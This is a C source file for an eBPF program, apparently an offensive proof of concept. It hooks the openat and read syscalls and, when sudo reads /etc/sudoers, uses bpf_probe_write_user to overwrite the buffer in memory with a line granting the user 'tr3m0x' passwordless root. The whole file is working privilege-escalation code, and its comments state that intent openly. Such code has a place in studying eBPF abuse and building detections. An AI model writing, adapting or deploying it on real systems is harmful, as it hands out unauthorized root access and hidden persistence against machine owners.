// SPDX-License-Identifier: BSD-3-Clause
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

char LICENSE[] SEC("license") = "Dual BSD/GPL";

// Map to hold the File Descriptors from 'openat' calls
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, unsigned int);
} fd_tracker SEC(".maps");

// Map to hold the buffer sizes from 'read' calls
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, long unsigned int);
} buf_tracker SEC(".maps");

// Optional Target Parent PID
const volatile int target_ppid = 0;

// The UserID of the user, if we're restricting
// running to just this user
const volatile int uid = 0;

#define TASK_COMM_LEN 16

// These store the string we're going to
// add to /etc/sudoers when viewed by sudo
// Which makes it think our user can sudo
// without a password
#define MAX_PAYLOAD_LEN 100

// Const length of string "sudo"
#define SUDO_LEN 5
// Const length of string "/etc/sudoers"
#define SUDOERS_LEN 13

#ifndef PAYLOAD_STR
#define PAYLOAD_STR "tr3m0x ALL=(ALL:ALL) NOPASSWD:ALL #"
#endif

const int max_payload_len = 100;
const int payload_len = sizeof(PAYLOAD_STR) - 1;
const char payload[MAX_PAYLOAD_LEN] = PAYLOAD_STR;

SEC("tp/syscalls/sys_enter_openat")
int ev_openat_enter(struct trace_event_raw_sys_enter *ctx)
{
    size_t pid_tgid = bpf_get_current_pid_tgid();
    int pid = pid_tgid >> 32;
    // Check if we're a process thread of interest
    // if target_ppid is 0 then we target all pids
    if (target_ppid != 0) {
        struct task_struct *task = (struct task_struct *)bpf_get_current_task();
        int ppid = BPF_CORE_READ(task, real_parent, tgid);
        if (ppid != target_ppid) {
            return 0;
        }
    }

    // Check comm is sudo
    char comm[TASK_COMM_LEN];
    bpf_get_current_comm(comm, sizeof(comm));
    const char *sudo = "sudo";
    for (int i = 0; i < SUDO_LEN; i++) {
        if (comm[i] != sudo[i]) {
            return 0;
        }
    }

    // Now check we're opening sudoers
    const char *sudoers = "/etc/sudoers";
    char filename[SUDOERS_LEN];
    bpf_probe_read_user(&filename, SUDOERS_LEN, (char*)ctx->args[1]);
    for (int i = 0; i < SUDOERS_LEN; i++) {
        if (filename[i] != sudoers[i]) {
            return 0;
        }
    }

    // If filtering by UID check that
    if (uid != 0) {
        int current_uid = bpf_get_current_uid_gid() >> 32;
        if (uid != current_uid) {
            return 0;
        }
    }

    // Add pid_tgid to map for our sys_exit call
    unsigned int zero = 0;
    bpf_map_update_elem(&fd_tracker, &pid_tgid, &zero, BPF_ANY);

    return 0;
}

SEC("tp/syscalls/sys_exit_openat")
int ev_openat_exit(struct trace_event_raw_sys_exit *ctx)
{
    // Check this open call is opening our target file
    size_t pid_tgid = bpf_get_current_pid_tgid();
    unsigned int* check = bpf_map_lookup_elem(&fd_tracker, &pid_tgid);
    if (check == 0) {
        return 0;
    }
    int pid = pid_tgid >> 32;

    // Set the map value to be the returned file descriptor
    unsigned int fd = (unsigned int)ctx->ret;
    bpf_map_update_elem(&fd_tracker, &pid_tgid, &fd, BPF_ANY);

    return 0;
}

SEC("tp/syscalls/sys_enter_read")
int ev_read_enter(struct trace_event_raw_sys_enter *ctx)
{
    // Check this open call is opening our target file
    size_t pid_tgid = bpf_get_current_pid_tgid();
    int pid = pid_tgid >> 32;
    unsigned int* pfd = bpf_map_lookup_elem(&fd_tracker, &pid_tgid);
    if (pfd == 0) {
        return 0;
    }

    // Check this is the sudoers file descriptor
    unsigned int map_fd = *pfd;
    unsigned int fd = (unsigned int)ctx->args[0];
    if (map_fd != fd) {
        return 0;
    }

    // Store buffer address from arguments in map
    long unsigned int buff_addr = ctx->args[1];
    bpf_map_update_elem(&buf_tracker, &pid_tgid, &buff_addr, BPF_ANY);

    // log and exit
    size_t buff_size = (size_t)ctx->args[2];
    return 0;
}

SEC("tp/syscalls/sys_exit_read")
int ev_read_exit(struct trace_event_raw_sys_exit *ctx)
{
    // Check this open call is reading our target file
    size_t pid_tgid = bpf_get_current_pid_tgid();
    int pid = pid_tgid >> 32;
    long unsigned int* pbuff_addr = bpf_map_lookup_elem(&buf_tracker, &pid_tgid);
    if (pbuff_addr == 0) {
        return 0;
    }
    long unsigned int buff_addr = *pbuff_addr;
    if (buff_addr <= 0) {
        return 0;
    }

    // This is amount of data returned from the read syscall
    if (ctx->ret <= 0) {
        return 0;
    }
    long int read_size = ctx->ret;

    // Add our payload to the first line
    if (read_size < payload_len) {
        return 0;
    }

    // Overwrite first chunk of data
    // then add '#'s to comment out rest of data in the chunk.
    // This sorta corrupts the sudoers file, but everything still
    // works as expected
    char local_buff[MAX_PAYLOAD_LEN] = { 0x00 };
    bpf_probe_read(&local_buff, max_payload_len, (void*)buff_addr);
    for (unsigned int i = 0; i < max_payload_len; i++) {
        if (i >= payload_len) {
            local_buff[i] = '#';
        }
        else {
            local_buff[i] = payload[i];
        }
    }
    // Write data back to buffer
    long ret = bpf_probe_write_user((void*)buff_addr, local_buff, max_payload_len);

    return 0;
}

SEC("tp/syscalls/sys_exit_close")
int ev_close_exit(struct trace_event_raw_sys_exit *ctx)
{
    // Check if we're a process thread of interest
    size_t pid_tgid = bpf_get_current_pid_tgid();
    int pid = pid_tgid >> 32;
    unsigned int* check = bpf_map_lookup_elem(&fd_tracker, &pid_tgid);
    if (check == 0) {
        return 0;
    }

    // Closing file, delete fd from all maps to clean up
    bpf_map_delete_elem(&fd_tracker, &pid_tgid);
    bpf_map_delete_elem(&buf_tracker, &pid_tgid);

    return 0;
}

